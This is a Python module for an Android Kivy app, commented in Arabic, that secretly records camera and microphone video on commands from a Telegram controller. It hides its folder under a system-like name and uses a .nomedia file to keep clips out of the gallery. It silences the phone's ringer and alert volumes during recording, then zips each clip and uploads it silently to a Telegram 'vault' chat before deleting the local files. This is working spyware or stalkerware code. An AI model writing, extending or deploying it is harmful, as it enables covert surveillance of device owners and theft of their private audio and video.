# -*- coding: utf-8 -*-
import os
import time
import threading
import zipfile
import logging
import gc
import shutil
from datetime import datetime

# ========== إعداد المسارات الموحدة ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
T = os.path.join(P, "v_tmp")   # مجلد مؤقت للفيديوهات

# إنشاء المجلدات و .nomedia
for d in [P, T]:
    if not os.path.exists(d):
        os.makedirs(d)

# إنشاء ملف .nomedia لإخفاء المجلد من المعرض
nomedia_path = os.path.join(T, ".nomedia")
if not os.path.exists(nomedia_path):
    try:
        with open(nomedia_path, 'w') as f:
            f.write("")
    except:
        pass

logging.basicConfig(
    filename=os.path.join(P, "v.log"),
    level=logging.ERROR,
    filemode='a',
    format='%(asctime)s - %(levelname)s - %(message)s'
)

try:
    from jnius import autoclass, PythonJavaClass, java_method
    JNI = True
except ImportError:
    JNI = False


class StreamManager:
    def __init__(self, tg=None):
        self.tg = tg                     # كائن TelegramUI
        self.recording = False
        self._recording_lock = threading.Lock()  # قفل للحماية
        self._old_volumes = {}           # حفظ مستويات الصوت القديمة
        self._old_ringer_mode = -1       # حفظ وضع الصامت القديم
        self._status_msg_id = None       # معرف رسالة الحالة
        self._recording_thread = None    # مرجع خيط التسجيل
        self._should_stop = False        # علامة لإيقاف التسجيل
        
        # إعدادات الجودة
        self._res_map = {
            "144": [256, 144, 150000],
            "360": [640, 360, 800000],
            "720": [1280, 720, 2500000],
            "1080": [1920, 1080, 5000000]
        }
        
        # تنظيف الملفات القديمة عند البدء
        self._cleanup_old_files()

    # ========== تنظيف الملفات القديمة ==========
    def _cleanup_old_files(self, max_age_seconds=3600):
        """حذف الملفات المؤقتة الأقدم من ساعة"""
        try:
            now = time.time()
            if os.path.exists(T):
                for f in os.listdir(T):
                    path = os.path.join(T, f)
                    if f == ".nomedia":
                        continue
                    try:
                        if os.path.isfile(path) and os.path.getmtime(path) < now - max_age_seconds:
                            os.remove(path)
                            logging.debug(f"Cleaned old file: {path}")
                    except:
                        pass
        except Exception as e:
            logging.error(f"Cleanup error: {e}")

    # ========== حذف آمن ==========
    def _safe_remove(self, path):
        try:
            if os.path.exists(path):
                os.remove(path)
                return True
        except Exception as e:
            logging.error(f"Safe remove error {path}: {e}")
        return False

    # ========== التحقق من الصلاحيات (محسّن مع رسائل واضحة) ==========
    def _check_permissions(self, request_if_missing=False):
        """
        التحقق من صلاحيات الكاميرا والميكروفون.
        
        المعاملات:
            request_if_missing: إذا كان True، سيتم طلب الصلاحيات المفقودة تلقائياً.
        
        الإرجاع:
            dict: {
                'ok': bool,              # True إذا كانت جميع الصلاحيات موجودة
                'camera': bool,          # حالة صلاحية الكاميرا
                'microphone': bool,      # حالة صلاحية الميكروفون
                'missing': list,         # قائمة بالصلاحيات المفقودة
                'message': str           # رسالة واضحة للحالة
            }
        """
        result = {
            'ok': False,
            'camera': False,
            'microphone': False,
            'missing': [],
            'message': ''
        }

        if not JNI:
            result['ok'] = True
            result['camera'] = True
            result['microphone'] = True
            result['message'] = "JNI غير متاح، يتم افتراض الصلاحيات"
            logging.warning("JNI not available, assuming permissions granted")
            return result

        try:
            from android.permissions import check_permission, Permission, request_permissions

            # التحقق من صلاحية الكاميرا
            try:
                cam_ok = check_permission(Permission.CAMERA)
                result['camera'] = cam_ok
                if not cam_ok:
                    result['missing'].append('CAMERA')
            except Exception as e:
                logging.error(f"Camera permission check error: {e}")
                result['camera'] = False
                result['missing'].append('CAMERA (check error)')

            # التحقق من صلاحية الميكروفون
            try:
                mic_ok = check_permission(Permission.RECORD_AUDIO)
                result['microphone'] = mic_ok
                if not mic_ok:
                    result['missing'].append('RECORD_AUDIO')
            except Exception as e:
                logging.error(f"Microphone permission check error: {e}")
                result['microphone'] = False
                result['missing'].append('RECORD_AUDIO (check error)')

            # طلب الصلاحيات المفقودة إذا طُلب ذلك
            if request_if_missing and result['missing']:
                try:
                    perms_to_request = []
                    if not result['camera']:
                        perms_to_request.append(Permission.CAMERA)
                    if not result['microphone']:
                        perms_to_request.append(Permission.RECORD_AUDIO)
                    
                    if perms_to_request:
                        logging.info(f"Requesting missing permissions: {perms_to_request}")
                        request_permissions(perms_to_request)
                        # إعادة التحقق بعد الطلب
                        for p in perms_to_request:
                            if check_permission(p):
                                if p == Permission.CAMERA:
                                    result['camera'] = True
                                    result['missing'].remove('CAMERA')
                                elif p == Permission.RECORD_AUDIO:
                                    result['microphone'] = True
                                    result['missing'].remove('RECORD_AUDIO')
                except Exception as e:
                    logging.error(f"Permission request error: {e}")

            # تحديث الحالة النهائية
            result['ok'] = result['camera'] and result['microphone']

            # بناء رسالة واضحة
            if result['ok']:
                result['message'] = "✅ جميع الصلاحيات متاحة (الكاميرا والميكروفون)"
            else:
                missing_parts = []
                if not result['camera']:
                    missing_parts.append("📷 الكاميرا")
                if not result['microphone']:
                    missing_parts.append("🎙️ الميكروفون")
                result['message'] = f"⚠️ الصلاحيات المفقودة: {', '.join(missing_parts)}"

            return result

        except Exception as e:
            logging.error(f"Permission check error: {e}")
            result['message'] = f"❌ خطأ في التحقق من الصلاحيات: {str(e)[:50]}"
            return result

    # ========== التحقق من توفر الكاميرا ==========
    def _is_camera_available(self, cam_idx):
        """التحقق من وجود الكاميرا المطلوبة"""
        if not JNI:
            return False
        try:
            Camera = autoclass('android.hardware.Camera')
            CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
            num_cameras = Camera.getNumberOfCameras()
            
            if num_cameras <= cam_idx:
                return False
                
            desired_facing = CameraInfo.CAMERA_FACING_BACK if cam_idx == 0 else CameraInfo.CAMERA_FACING_FRONT
            for i in range(num_cameras):
                info = CameraInfo()
                Camera.getCameraInfo(i, info)
                if info.facing == desired_facing:
                    return True
            return False
        except Exception as e:
            logging.error(f"Camera availability check error: {e}")
            return False

    # ========== كتم صوت قسري ==========
    def _mute_audio(self, mute=True):
        if not JNI:
            return
        try:
            AudioManager = autoclass('android.media.AudioManager')
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            activity = PythonActivity.mActivity
            am = activity.getSystemService(activity.AUDIO_SERVICE)

            if mute:
                # حفظ وضع الصامت القديم
                self._old_ringer_mode = am.getRingerMode()
                am.setRingerMode(AudioManager.RINGER_MODE_SILENT)

                # كتم قنوات الصوت الفردية
                streams = [
                    AudioManager.STREAM_SYSTEM,
                    AudioManager.STREAM_NOTIFICATION,
                    AudioManager.STREAM_ALARM,
                    AudioManager.STREAM_RING
                ]
                for s in streams:
                    try:
                        self._old_volumes[s] = am.getStreamVolume(s)
                        am.setStreamVolume(s, 0, 0)
                    except:
                        pass
            else:
                # استعادة وضع الصامت القديم
                if self._old_ringer_mode != -1:
                    try:
                        am.setRingerMode(self._old_ringer_mode)
                    except:
                        pass
                # استعادة مستويات الصوت لكل قناة
                for s, vol in self._old_volumes.items():
                    try:
                        am.setStreamVolume(s, vol, 0)
                    except:
                        pass
                self._old_volumes.clear()
                self._old_ringer_mode = -1
        except Exception as e:
            logging.error(f"Mute audio error: {e}")

    # ========== التحقق من صحة ملف الفيديو ==========
    def _is_video_valid(self, path, min_duration_ms=500, min_size_bytes=10240):
        if not os.path.exists(path):
            return False
        try:
            size = os.path.getsize(path)
            if size < min_size_bytes:
                logging.warning(f"Video too small: {size} bytes")
                return False
        except:
            return False
            
        if not JNI:
            return True
            
        try:
            Retriever = autoclass('android.media.MediaMetadataRetriever')
            retriever = Retriever()
            retriever.setDataSource(path)
            duration_str = retriever.extractMetadata(Retriever.METADATA_KEY_DURATION)
            retriever.release()
            
            if duration_str:
                duration = int(duration_str)
                if duration >= min_duration_ms:
                    return True
                else:
                    logging.warning(f"Video too short: {duration} ms")
            else:
                logging.warning("Could not extract video duration")
        except Exception as e:
            logging.error(f"Video validation error: {e}")
        return False

    # ========== إرسال / تحديث رسالة الحالة ==========
    def _send_status_update(self, text, chat_id):
        if not self.tg:
            return None
        try:
            if self._status_msg_id is None:
                resp = self.tg._api("sendMessage", {
                    "chat_id": chat_id, 
                    "text": text, 
                    "disable_notification": True
                })
                if resp and resp.get('ok'):
                    self._status_msg_id = resp['result']['message_id']
            else:
                self.tg._api("editMessageText", {
                    "chat_id": chat_id, 
                    "message_id": self._status_msg_id, 
                    "text": text
                })
        except Exception as e:
            logging.error(f"Status update error: {e}")

    # ========== بدء التسجيل (الواجهة الخارجية) ==========
    def record(self, mon, cam=0, dur=15):
        """بدء تسجيل فيديو"""
        with self._recording_lock:
            if self.recording:
                logging.warning("Recording already in progress")
                return False

            # التحقق من الصلاحيات مع طلب تلقائي
            perms_result = self._check_permissions(request_if_missing=True)
            
            if not perms_result['ok']:
                logging.error(f"Permission check failed: {perms_result['message']}")
                # إرسال رسالة خطأ للمستخدم
                if self.tg and mon.ctrl:
                    self.tg._api("sendMessage", {
                        "chat_id": mon.ctrl,
                        "text": f"❌ {perms_result['message']}\nالرجاء منح الصلاحيات من إعدادات الجهاز."
                    })
                return False

            if not self._is_camera_available(cam):
                logging.error(f"Camera {cam} not available")
                if self.tg and mon.ctrl:
                    self.tg._api("sendMessage", {
                        "chat_id": mon.ctrl,
                        "text": f"❌ الكاميرا {cam} غير متوفرة على هذا الجهاز."
                    })
                return False

            self.recording = True
            self._should_stop = False

        self._recording_thread = threading.Thread(
            target=self._worker, 
            args=(mon, cam, dur), 
            daemon=True
        )
        self._recording_thread.start()
        return True

    # ========== إلغاء التسجيل ==========
    def cancel_recording(self):
        """إلغاء التسجيل الحالي"""
        with self._recording_lock:
            if not self.recording:
                return False
            self._should_stop = True
            return True

    # ========== معالج التسجيل الأساسي (خيط منفصل) ==========
    def _worker(self, mon, cam_idx, dur):
        """معالج التسجيل الرئيسي"""
        self._status_msg_id = None

        # إرسال إشعار "جاري التسجيل..."
        self._send_status_update("🎥 جاري التسجيل... ⏳", mon.ctrl)

        # استخدام مسار مؤقت مخفي
        timestamp = int(time.time())
        temp_path = os.path.join(T, f".rec_{timestamp}.tmp")
        raw_path = os.path.join(T, f"rec_{timestamp}.mp4")
        zipped_path = os.path.join(T, f"rec_{timestamp}.zip")

        # إعدادات الجودة
        res_key = getattr(mon, 'video_res', "360")
        w, h, bitrate = self._res_map.get(res_key, self._res_map["360"])

        success = False
        media_recorder = None

        if JNI:
            self._mute_audio(True)
            try:
                MediaRecorder = autoclass('android.media.MediaRecorder')
                media_recorder = MediaRecorder()

                # ضبط مصادر الصوت والفيديو
                media_recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
                media_recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA)

                # تنسيق الإخراج والترميز
                media_recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                media_recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                media_recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)

                # ضبط الدقة ومعدل البت والإطارات
                media_recorder.setVideoSize(w, h)
                media_recorder.setVideoEncodingBitRate(bitrate)
                media_recorder.setVideoFrameRate(30)

                # اتجاه الفيديو
                orientation = 270 if cam_idx == 1 else 90
                media_recorder.setOrientationHint(orientation)

                # ملف الإخراج المؤقت
                media_recorder.setOutputFile(temp_path)

                media_recorder.prepare()
                media_recorder.start()
                logging.info(f"Recording started: {w}x{h}, {bitrate} bps")

                # التسجيل مع إمكانية الإلغاء
                for i in range(dur):
                    if self._should_stop:
                        logging.info("Recording cancelled by user")
                        break
                    time.sleep(1)

                # إيقاف التسجيل إذا لم يتم الإلغاء
                if not self._should_stop:
                    media_recorder.stop()
                    success = True
                else:
                    # إذا تم الإلغاء، فقط أوقف بدون حفظ
                    try:
                        media_recorder.stop()
                    except:
                        pass

            except Exception as e:
                logging.error(f"Recording worker error: {e}")
                success = False
            finally:
                if media_recorder:
                    try:
                        media_recorder.reset()
                        media_recorder.release()
                    except:
                        pass
                self._mute_audio(False)

        # مرحلة ما بعد التسجيل
        if success and self._is_video_valid(temp_path):
            try:
                # نقل الملف من .tmp إلى .mp4
                if os.path.exists(temp_path):
                    shutil.move(temp_path, raw_path)

                # ضغط الفيديو إلى ZIP
                with zipfile.ZipFile(zipped_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                    zf.write(raw_path, os.path.basename(raw_path))

                # إرسال الفيديو إلى قناة الخزنة (vault)
                vault = getattr(mon, 'vlt', None)
                if self.tg and vault:
                    caption = f"🎥 {res_key}p | الكاميرا {cam_idx} | {datetime.now().strftime('%H:%M:%S')}"
                    with open(zipped_path, 'rb') as f:
                        resp = self.tg._api("sendDocument", {
                            "chat_id": vault,
                            "caption": caption,
                            "disable_notification": True
                        }, {"document": f})
                        
                    if resp and resp.get('ok'):
                        self._send_status_update("✅ تم رفع الفيديو بنجاح", mon.ctrl)
                    else:
                        self._send_status_update("⚠️ فشل رفع الفيديو إلى الخزنة", mon.ctrl)
                else:
                    self._send_status_update("⚠️ لا يوجد قناة خزنة لإرسال الفيديو", mon.ctrl)

                # حذف الملفات المؤقتة
                self._safe_remove(raw_path)
                self._safe_remove(zipped_path)

            except Exception as e:
                logging.error(f"Finalization error: {e}")
                self._send_status_update(f"❌ فشل رفع الفيديو: {str(e)[:50]}", mon.ctrl)
                self._safe_remove(raw_path)
                self._safe_remove(zipped_path)
        else:
            # حذف الملف التالف أو غير الصالح
            if os.path.exists(temp_path):
                self._safe_remove(temp_path)
            if not self._should_stop:
                self._send_status_update("⚠️ فشل التسجيل (ملف تالف أو غير صالح)", mon.ctrl)
            else:
                self._send_status_update("⏹️ تم إلغاء التسجيل", mon.ctrl)

        # تنظيف إضافي
        self._safe_remove(temp_path)
        self._safe_remove(raw_path)
        self._safe_remove(zipped_path)

        # إعادة تعيين الحالة
        with self._recording_lock:
            self.recording = False
            self._should_stop = False
            self._status_msg_id = None
            
        gc.collect()

    # ========== الحصول على حالة التسجيل ==========
    def get_status(self):
        """الحصول على حالة المسجل"""
        with self._recording_lock:
            return {
                "recording": self.recording,
                "should_stop": self._should_stop,
                "has_tg": self.tg is not None
            }

    # ========== الحصول على حالة الصلاحيات ==========
    def get_permissions_status(self):
        """الحصول على حالة الصلاحيات بتنسيق مناسب للعرض"""
        result = self._check_permissions(request_if_missing=False)
        return {
            "ok": result['ok'],
            "camera": result['camera'],
            "microphone": result['microphone'],
            "missing": result['missing'],
            "message": result['message']
        }

    # ========== تنظيف شامل ==========
    def cleanup_all(self):
        """تنظيف شامل للمجلد المؤقت"""
        self._cleanup_old_files(max_age_seconds=0)  # حذف كل الملفات


# ========== دالة المصنع ==========
def create(tg=None):
    return StreamManager(tg)
